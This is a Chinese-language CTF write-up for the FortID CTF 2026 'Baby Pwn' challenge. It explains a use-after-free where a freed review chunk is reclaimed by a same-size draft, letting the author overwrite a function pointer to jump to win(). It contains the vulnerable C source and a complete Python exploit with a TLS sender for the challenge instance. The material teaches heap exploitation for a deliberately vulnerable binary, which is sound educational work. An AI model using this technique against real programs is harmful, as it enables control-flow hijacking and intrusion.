---
title: "Baby Pwn — UAF 改写函数指针调用 win() (FortID CTF)"
description: FortID CTF 入门 pwn 题：删除 review 后 favourite 变悬空指针，用同大小 draft 复用堆块覆盖 display 函数指针，直接跳 win() 读 flag。
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Pwn ｜ 赛事：FortID CTF 2026 ｜ 关键词：Use-After-Free、堆块复用、函数指针覆盖、No-PIE 后门
>
> Flag: `FORTID{...}`（本机用假 flag.txt 完整复现成功；真 flag 需连题目实例，1337 端口从我这台机器出网被挡，没能取到真值）

## 题目背景

题面是一个"留言板"：提交 review、把它标记为 favourite、删除、写草稿、预览 favourite。题目直接给了源码 `chall.c` 和二进制 `chall`，而且源码里明晃晃放着一个后门 `win()`——只要能调用它就会 `fopen("flag.txt")` 把内容打印出来。所以这题的核心就是：**想办法把控制流劫持到 `win()`**。

## 分析

先过一遍保护。二进制是动态链接、**No-PIE**（`Type: EXEC`，所有地址都是固定的 `0x40xxxx`），这点很关键——`win` 的地址可以直接硬编码。

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
$ readelf -h chall | grep Type
  Type: EXEC (Executable file)          # No PIE -> win 地址固定
$ readelf -lW chall | grep GNU_STACK
  GNU_STACK ... RW                      # NX 开（栈不可执行）
$ readelf -d chall | grep -i now
  FLAGS  BIND_NOW                        # Full RELRO
$ nm chall | grep -iE ' win$| show_review'
000000000040135f T win                  # <-- 目标
0000000000401336 t show_review
```

再看源码里的两个结构体，这是漏洞的温床：

```c
#define REVIEW_TEXT_SIZE 32
struct review {
    char text[REVIEW_TEXT_SIZE];        // 偏移 0, 占 32 字节
    void (*display)(review_t *review);  // 偏移 32, 一个函数指针
};                                      // sizeof == 40
typedef struct {
    char contents[sizeof(review_t)];    // 草稿缓冲，恰好也是 40 字节
} draft_t;
```

`review` 的后 8 个字节是一个**函数指针** `display`，正常值是 `show_review`。`draft` 的 `contents` 和 `review` **一模一样大**（都是 40 字节），这是作者故意埋的"同大小堆块"。

关键的几个操作：

```c
static void submit_review(void){
    review = malloc(sizeof(*review));        // 分配 40 字节
    read_text(review->text, 32);
    review->display = show_review;           // 函数指针初始化
}
static void mark_favourite(void){ favourite = review; }   // 只是拷指针
static void delete_review(void){
    free(review);
    review = NULL;                           // review 置空, 但 favourite 没动!
}
static void write_draft(void){
    ...
    draft = malloc(sizeof(*draft));          // 又是 40 字节 -> 复用刚 free 的块
    read_exact(draft->contents, length);     // 精确读 length 字节, length 可到 40
}
static void preview_favourite(void){
    favourite->display(favourite);           // 调用悬空指针里的函数指针!
}
```

## 关键漏洞

一条典型的 **Use-After-Free + 堆块类型混淆**：

1. `delete_review()` 只把 `review` 置 `NULL`，却**没有清 `favourite`**。如果我先 `mark_favourite()` 再 `delete_review()`，`favourite` 就变成了指向**已释放堆块**的悬空指针。
2. `review` 和 `draft` 都是 40 字节，`malloc(40)` 落在同一个 tcache bin（chunk size `0x30`）。`delete` 之后那块进了 tcache，紧接着 `write_draft()` 的 `malloc(40)` 会**原样把它取回来**。
3. `write_draft` 用 `read_exact` 精确读 `length` 字节到 `draft->contents`，`length` 最大可取到 `sizeof(draft->contents)=40`。于是我能写满 40 字节，其中**偏移 32~39 正好盖在 `review->display` 这个函数指针上**。
4. 最后 `preview_favourite()` 执行 `favourite->display(favourite)`——而 `favourite` 还指着那块被我用草稿内容改写过的内存，于是函数指针被我换成了 `win`。

因为 No-PIE，`win = 0x40135f` 是固定值，直接写进去即可。`win(review_t*)` 的参数根本没用到，所以传什么都无所谓。

## 利用步骤

菜单顺序：`1` 提交 → `2` 收藏 → `3` 删除 → `4` 写草稿（长度 40，内容 = 32 字节填充 + `p64(win)`）→ `5` 预览触发。

注意 `read_exact` 用的是 `fread`，是**二进制安全**的，`win` 地址里的 `\x00` 不会被截断。

```python
#!/usr/bin/env python3
import struct
WIN = 0x40135f
payload  = b"A"*32 + struct.pack("<Q", WIN)   # 40 字节：填满 text[32] + 覆盖 display

data  = b"1\n"            # submit review
data += b"placeholder\n"  # review 文本（随便）
data += b"2\n"            # mark favourite  -> favourite = review
data += b"3\n"            # delete review   -> free, favourite 悬空
data += b"4\n"            # write draft
data += b"40\n"           # 草稿长度 = 40（够到偏移 32 的函数指针）
data += payload           # read_exact 精确读这 40 字节
data += b"5\n"            # preview favourite -> favourite->display() == win()
import sys; sys.stdout.buffer.write(data)
```

打远程时套一层 TLS（题目实例是 `tcp-ssl`）即可，核心输入字节完全一样：

```python
import socket, ssl
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
raw = socket.create_connection((HOST, 1337))
s = ctx.wrap_socket(raw, server_hostname=HOST)
s.sendall(data)
print(s.recv(4096).decode(errors="replace"))
```

## Flag

本机放一个假的 `flag.txt` 跑真实二进制，payload 一次命中：

```
$ ./chall < input.bin
...
> Draft length (1-40): Send exactly 40 draft bytes:
Draft saved.
...
> Five stars! Here is your prize:
FORTID{FAKE_BABY_PWN_LOCAL_demo}
```

`win()` 被成功调用、flag.txt 被打印，逻辑完全验证。

真 flag 形如 `FORTID{...}`：需要把同一份输入发到题目实例（`*.inst14.ctf.fortid.com:1337`，`tcp-ssl`）去拿。我这边 HTTPS API（443）能通、能把实例拉起来，但到 1337 端口的裸 TCP 出网被环境挡死（IPv4 超时、无 IPv6 路由），所以真 flag 没能在本机取回——手法本身是 100% 可用的。

## 小结 / 收获

- **"删除时忘了清旁路指针"** 是 UAF 最经典的触发方式：这里 `review=NULL` 做得很干净，但 `favourite` 被遗漏了。
- 作者特意让 `draft_t` 和 `review_t` **同大小**，就是提示你用 tcache 的"同 bin 原样取回"做堆块复用 + 类型混淆。
- 对象里只要存了**函数指针**（这里是 `display`），一旦能覆盖它，配合 No-PIE 的固定后门地址，利用会非常直白——连 ROP、泄漏都不用。
- 复盘时第一件事永远是 `checksec`：确认 No-PIE 的那一刻，就知道 `win` 地址可以写死了。
